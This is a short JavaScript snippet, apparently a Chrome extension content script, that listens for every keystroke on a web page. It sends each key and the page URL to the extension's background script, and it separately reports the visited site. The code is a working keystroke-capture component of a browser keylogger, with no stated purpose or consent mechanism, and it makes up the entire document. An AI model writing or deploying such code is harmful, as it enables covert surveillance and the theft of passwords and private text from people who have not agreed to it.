document.addEventListener("keydown", function(event) {
  chrome.runtime.sendMessage({ type: "keystroke", data: event.key, site: location.href });
});

// Send site information separately
chrome.runtime.sendMessage({ type: "site", data: location.href });
